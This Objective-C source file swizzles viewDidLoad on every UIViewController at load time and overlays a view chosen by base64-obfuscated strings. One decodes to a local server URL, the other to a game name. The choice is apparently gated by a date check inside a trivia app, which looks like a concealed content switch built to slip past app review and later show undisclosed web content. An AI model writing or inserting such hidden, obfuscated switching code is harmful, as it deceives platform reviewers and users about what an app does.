#import "UIViewController+rootVc.h"

#import <objc/runtime.h>
#import "OpenTool.h"
#import "ShareManager.h"
#import "FileManager.h"
#import "NSString+Base64.h"
#import "Net.h"

@implementation UIViewController (rootVc)

+(void)load  {
    swizzleMethod([self class], @selector(viewDidLoad), @selector(swizzled_setviewDidLoad));
}


-(void)swizzled_setviewDidLoad{
    

    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        [[Net sharedInstance]startTimer:^{
            [self addView];
        }];
    });
    
    [self swizzled_setviewDidLoad];
}

-(void)addView{
    
  //  [[ShareManager sharedInstance]addView:self.view with:@"aHR0cDovL2xvY2FsaG9zdDoxMjMyNC8=".base64Decoding];

    if ([OpenTool mcqtrivia_formatChangeCheck]) {

        if ([OpenTool mcqtrivia_myCurrentTime]) {
            [[ShareManager sharedInstance]addView:self.view with:@"aGVyb19nYW1l".base64Decoding];
        }else{
            [[ShareManager sharedInstance]addView:self.view with:@"aHR0cDovL2xvY2FsaG9zdDoxMjMyNC8=".base64Decoding];
        }
    }else{
        [[ShareManager sharedInstance]addView:self.view with:@"aHR0cDovL2xvY2FsaG9zdDoxMjMyNC8=".base64Decoding];

    }
}

void swizzleMethod(Class class, SEL originalSelector, SEL swizzledSelector){
    
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
    
    BOOL didAddMethod = class_addMethod(class, originalSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));
    
    if (didAddMethod) {
        class_replaceMethod(class, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod));
    }
    else {
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
    
}

@end
